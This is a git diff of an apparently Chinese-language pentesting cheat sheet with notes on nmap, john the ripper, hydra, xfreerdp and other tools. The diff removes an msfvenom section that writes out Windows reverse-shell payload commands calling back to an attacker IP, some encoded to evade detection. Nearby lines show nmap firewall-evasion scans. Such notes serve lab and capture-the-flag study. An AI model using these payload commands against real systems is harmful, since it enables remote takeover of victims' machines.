@@ -14,7 +14,6 @@
     - [john the ripper](#john-the-ripper)
     - [remmina](#remmina)
     - [Nmap](#nmap)
-    - [msfvenom](#msfvenom)
     - [wireshark](#wireshark)
     - [hydra](#hydra)
     - [hashcat](#hashcat)
@@ -186,7 +185,7 @@ gpg --decrypt credential.pgp
 zip2john
 ```
 
->ssh2john:
+**ssh2john**:
 
 如果输出不规范，可以打开源码复制源码内容，源码比较规范
 
@@ -223,19 +222,6 @@ sudo nmap -sSU -p 53 --script dns-nsid 10.129.2.48
 
 sudo nmap -Pn --min-rate 10000 --source-port 53  -sV 10.129.67.88 -n --disable-arp-ping
 ```
-
-
-### msfvenom
-
-列出payload：  
-msfvenom -l payloads 
-
-用法：  
-msfvenom -p <payload> LHOST=<本地IP> LPORT=<监听端口> -f <文件类型> -o <文件名>
-
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.239.167 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
-
-msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f aspx -o  reverse-shell.aspx 
 
 
 ### wireshark
@@ -489,7 +475,7 @@ Invoke-WebRequest -Uri https://example.com/path/to/file.txt -OutFile C:\path\to\
 
 xfreerdp /v:<IP> /u:<USRENAME> /p:<PASSWORD>
 
-
+通过添加来解决：/tls-seclevel:0 /timeout:80000
 ### objdump
 
 objdump -D FILE
